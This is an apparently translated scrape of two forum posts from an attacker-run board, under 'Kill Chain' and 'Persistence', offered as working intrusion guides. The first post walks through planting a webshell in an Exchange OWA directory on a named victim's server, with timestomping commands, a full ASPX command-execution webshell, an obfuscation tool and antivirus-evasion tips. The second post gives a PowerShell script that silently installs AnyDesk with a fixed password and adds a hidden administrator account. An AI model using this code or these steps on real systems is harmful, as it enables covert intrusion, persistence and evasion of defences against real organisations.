+: February 05, 2021, 11:32:00 am
+Recorded by
+
+Finding and uploading a webshell in Exchange Microsoft
+In cobalt \ msfe we take a session and ping.
+Take the example of derigo.us
+
+Their mail server is mail.derigo.us
+
+We ping it from under the local area. Ipak 10.4.205.90
+Local subnet? Yes. So in LAN and we can modify it.
+
+Shoeing the admin token
+
+We remove the listing of the dira c\windows\system32\inetsrv\config::
+
+Code: [Highlight]
+
+Directory of \\10.4.205.90\C$\Windows\system32\inetsrv\config
+28/11/2013 12:08 <DIR> .
+28/11/2013 12:08 <DIR> ..
+30/01/2020 03:50 18,258 administration.config
+30/01/2020 03:50 149,535 applicationHost.config
+28/11/2013 12:08 <DIR> Export
+28/11/2013 12:08 490 redirection.config
+30/01/2020 03:46 <DIR> schema
+
+
+We see applicationHost.config
+Download, open, look:
+
+Code: [Highlight]
+
+<application path="/PowerShell" applicationPool="MSExchangePowerShellAppPool">
+<virtualDirectory path="/" physicalPath="C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\PowerShell" />
+</application>
+<application path="/owa" applicationPool="MSExchangeOWAAppPool">
+<virtualDirectory path="/" physicalPath="C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\owa" />
+</application>
+<application path="/owa/Calendar" applicationPool="MSExchangeOWACalendarAppPool">
+<virtualDirectory path="/" physicalPath="C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\owa" />
+</application>
+<application path="/ecp" applicationPool="MSExchangeECPAppPool">
+<virtualDirectory path="/" physicalPath="C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\ecp" />
+</application>
+<application path="/Autodiscover" applicationPool="MSExchangeAutodiscoverAppPool">
+<virtualDirectory path="/" physicalPath="C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\Autodiscover" />
+</application>
+<application path="/Autodiscover/bin" applicationPool="MSExchangeAutodiscoverAppPool">
+<virtualDirectory path="/" physicalPath="C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\Autodiscover\bin" />
+</application>
+<application path="/Autodiscover/help" applicationPool="MSExchangeAutodiscoverAppPool">
+<virtualDirectory path="/" physicalPath="C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\Autodiscover\help" />
+</application>
+<application path="/Microsoft-Server-ActiveSync" applicationPool="MSExchangeSyncAppPool">
+<virtualDirectory path="/" physicalPath="C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\sync" />
+</application>
+
+
+We see ClientAccess / FrontEnd in these names - the dira is most likely exactly what is needed.
+In this case it is:
+C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\owa
+
+
+Let's go there. Listing of this dira:
+
+Code: [Highlight]
+
+Volume Serial Number is 40B9-B0CD
+Directory of \\10.4.205.90\C$\Program Files\Microsoft\Exchange Server\V14\ClientAccess\owa
+
+01/23/2020 03:25 <DIR> .
+01/23/2020 03:25 <DIR> ..
+11/29/2013 08:21 <DIR> 14.3.123.3
+29/11/2013 10:43 <DIR> 14.3.158.1
+04/10/2014 05:47 <DIR> 14.3.174.1
+04/10/2014 06:01 <DIR> 14.3.210.2
+06/25/2016 03:02 <DIR> 14.3.294.0
+07/06/2017 02:26 <DIR> 14.3.351.0
+17/08/2017 02:33 <DIR> 14.3.361.1
+08/02/2018 03:19 <DIR> 14.3.382.0
+05/04/2018 06:56 <DIR> 14.3.388.0
+24/05/2018 02:41 <DIR> 14.3.399.0
+25/10/2018 02:30 <DIR> 14.3.415.0
+23/02/2019 18:26 <DIR> 14.3.439.0
+23/01/2020 03:38 <DIR> 14.3.468.0
+14/12/2013 11:49 <DIR> 8.3.327.1
+23/01/2020 03:25 <DIR> auth
+23/01/2020 03:25 <DIR> Bin
+06/26/2019 18:43 4,842 casredirect.aspx
+06/02/2013 07:00 42 csdc.gif
+29/11/2013 08:21 <DIR> Current
+06/02/2013 07:00 853 default.aspx
+06/02/2013 07:00 202 disabled.aspx
+29/11/2013 08:21 <DIR> forms
+06/02/2013 07:00 102 global.asax
+26/06/2019 18:43 3,447 info.aspx
+26/06/2019 18:43 5,421 languageselection.aspx
+26/06/2019 18:43 1,714 redir.aspx
+06/02/2013 07:00 63,044 SmallIcons.xml
+29/11/2013 08:21 <DIR> smime
+11/29/2013 08:21 <DIR> spell
+06/02/2013 07:00 2,008 urlblockederror.aspx
+23/01/2020 03:38 146,681 web.config
+06/02/2013 07:00 137,150 web.config.bak
+26/06/2019 18:43 1,061 WebReadyView.aspx
+26/06/2019 18:43 1,292 WebReadyViewBody.aspx
+06/26/2019 18:43 7,406 WebReadyViewHead.aspx
+06/02/2013 07:00 1,651 WebReadyViewIndicator.aspx
+
+
+This is what is in the home directory.
+
+Authorization for the user looks like this on the url
+https://mail.derigo.us/owa/auth/logon.aspx
+
+23/01/2020 03:25 <DIR> auth
+
+Let's go here, listing:
+
+Code: [Highlight]
+
+Directory of \\10.4.205.90\C$\Program Files\Microsoft\Exchange Server\V14\ClientAccess\owa\auth
+01/23/2020 03:25 <DIR> .
+01/23/2020 03:25 <DIR> ..
+26/06/2019 18:43 8,363 error.aspx
+06/02/2013 07:00 1,888 error2.aspx
+26/06/2019 18:43 7,226 expiredpassword.aspx
+07/08/2014 00:24 73,392 exppw.dll
+06/26/2019 18:43 6,067 logoff.aspx
+26/06/2019 18:43 13,479 logon.aspx
+15/01/2019 02:00 104,528 owaauth.dll
+
+
+Test spill 1.txt with 1-2 bytes.
+
+Check availability by URL
+https://mail.derigo.us/owa/auth/1.txt
+
+If everything is ok - load our webshell.
+
+Next, we grind it so that it looks like the files next to it.
+
+The following syntax
+
+POWERSHELL CODE::
+
+Code: [Highlight]
+
+(Get-Item "D:\Test\log1.txt").CreationTime=("3 August 2019 17:00:00")
+(Get-Item "D:\Test\log1.txt").LastWriteTeim=("3 August 2019 17:00:00")
+
+
+In cobalt like this:
+Code: [Highlight]
+
+powershell (Get-Item "\\10.4.205.90\C$\Program Files\Microsoft\Exchange Server\V14\ClientAccess\owa\auth\webshell.aspx").CreationTime=("15 January 2019 02:00:00" )
+powershell (Get-Item "\\10.4.205.90\C$\Program Files\Microsoft\Exchange Server\V14\ClientAccess\owa\auth\webshell.aspx").LastWriteTime=("15 January 2019 02:00:00" )
+
+
+On the date we put the touch of the files that are nearby in this dir.
+
+Next, we update the listing and make sure that the touch of the webshell has changed.
+We go by
+https://mail.derigo.us/owa/auth/webshell.aspx
+
+The name of the *.aspx file that we spill is changed from time to time.
+And we make sure that the webshell worked correctly and the commands are available.
+We use it only in extreme cases, since we consider such a fix to be "quiet" in case I drank the rest.
+
+All credits to @rozetka
+« Last Edit: February 05, 2021, 02:45:26 pm by Alter »
+
+Rozetka
+
+Administrator
+Member
+*****
+35
+View Profile E-mail Private Message (Offline)
+
+Reply #1 : February 11, 2021, 02:21:15 pm
+Recorded by
+
+Similarly, you can put the webshell in the node where it is
+RD Web
+
+Usually located on the subdomain remote.domain.com/RDWeb
+
+Located here:
+Code: [Highlight]
+
+%windir%\web\rdweb\pages\
+
+
+Rozetka
+
+Administrator
+Member
+*****
+35
+View Profile E-mail Private Message (Offline)
+
+Reply #2 : February 11, 2021, 02:22:47 pm
+Recorded by
+
+The lightest and most durable webshell I use is this:
+Code: [Highlight]
+
+<%@ Page Language="VB" Debug="true" %>
+<%@ import Namespace="system.IO" %>
+<%@ import Namespace="System.Diagnostics" %>
+
+<script runat="server">
+
+Sub RunCmd(Src As Object, E As EventArgs)
+Dim myProcess As New Process()
+Dim myProcessStartInfo As New ProcessStartInfo(xpath.text)
+myProcessStartInfo.UseShellExecute = false
+myProcessStartInfo.RedirectStandardOutput = true
+myProcess.StartInfo = myProcessStartInfo
+myProcessStartInfo.Arguments=xcmd.text
+myProcess.Start()
+
+Dim myStreamReader As StreamReader = myProcess.StandardOutput
+Dim myString As String = myStreamReader.Readtoend()
+myProcess.Close()
+mystring=replace(mystring,"<","&lt;")
+mystring=replace(mystring,">","&gt;")
+result.text= vbcrlf & "<pre>" & mystring & "</pre>"
+end sub
+
+</script>
+
+<html>
+<body>
+<form runat="server">
+<p><asp:Label id="L_p" runat="server" width="80px">Program</asp:Label>
+<asp:TextBox id="xpath" runat="server" Width="300px">c:\windows\system32\cmd.exe</asp:TextBox>
+<p><asp:Label id="L_a" runat="server" width="80px">Arguments</asp:Label>
+<asp:TextBox id="xcmd" runat="server" Width="300px" Text="/c net user">/c net user</asp:TextBox>
+<p><asp:Button id="Button" onclick="runcmd" runat="server" Width="100px" Text="Run"></asp:Button>
+<p><asp:Label id="result" runat="server"></asp:Label>
+</form>
+</body>
+</html>
+
+
+
+Besides!
+
+ESET NOD32 fires the webshell, if you see it on the exchange\RDWeb, then try adding the folder to the exclusions or alternatively backdoor
+Sophos fired webshell (02/13/2020)
+
+UPD 14 02 2020 >
+Check webshells in runtime on dyncheck without internet, some are fired by your aver, some are not.
+« Last Edit: February 14, 2021, 06:20:32 pm by Rozetka »
+
+cybercat
+
+Users
+Member
+*
+3
+View Profile E-mail Private Message (Offline)
+
+Answer #3 : March 23, 2021, 05:26:14 am
+Recorded by
+
+For those who have asp webshell removed \ scorched by Aver! you can obfuscate not only the one in the archive, it removes detections
+link: https://github.com/grCod/poly
+---
+command example:
+
+poly.py -c aspx -e rnd -p shells/shell.aspx -j
+---
+
+'-c', = 'Shell code. [php, asp, aspx]'
+'-e', = 'Encoding method. [b64, ord, rnd, rot]'
+'-p', = 'Path to shell.'
+'-j', = 'Add junk code.'
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Persistence »
+Exchange Webshell
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Persistence »
+Anydesk
+
+Anydesk
+Alter 1 45
+« previous topic next topic »
+
+Pages: 1
+alter
+
+Administrator
+Member
+*****
+28
+View Profile Private Message (Offline)
+
+: February 05, 2021, 11:32:35 am
+Recorded by
+
+edited by rosetka >
+Quote
+
+Function AnyDesk {
+
+mkdir "C:\ProgramData\AnyDesk"
+# Download AnyDesk
+$clnt = new-object System.Net.WebClient
+$url = "http://download.anydesk.com/AnyDesk.exe"
+$file = "C:\ProgramData\AnyDesk.exe"
+$clnt.DownloadFile($url,$file)
+
+
+cmd.exe /c C:\ProgramData\AnyDesk.exe --install C:\ProgramData\AnyDesk --start-with-win --silent
+
+
+cmd.exe /c echo J9kzQ2Y0qO | C:\ProgramData\anydesk.exe --set-password
+
+
+net user oldadministrator "qc69t4B#Z0kE3" /add
+net localgroup Administrators oldadministrator /ADD
+reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v oldadministrator /t REG_DWORD /d 0 /f
+
+cmd.exe /c C:\ProgramData\AnyDesk.exe --get-id
+
+}
+
+AnyDesk
+
+
+Run code in Powershell ISE Run As Admin
+At the output we get an ID
+We keep it to ourselves
+On a separate dedicated disk \ vps \ virtual machine, download Anydesk, specify the ID
+Click Console Account
+Enter password
+Quote
+
+J9kzQ2Y0qO
+
+And then we log in with a local admin or a domain account and use the charms of Anydesk
+You can also download / upload to / from the victim's machine, which can be convenient in inspecting and searching for documentation point by point.
+
+May have crashes. Didn't come back after reboot. Have a spare backdoor
+
+Bypasses Cylance Protect and most AVs on 02/11/2020, software with a signature and is used in administration.
+
+by Rozetka
+« Last Edit: February 11, 2021, 02:36:39 pm by Rozetka »
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Persistence »
+Anydesk
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
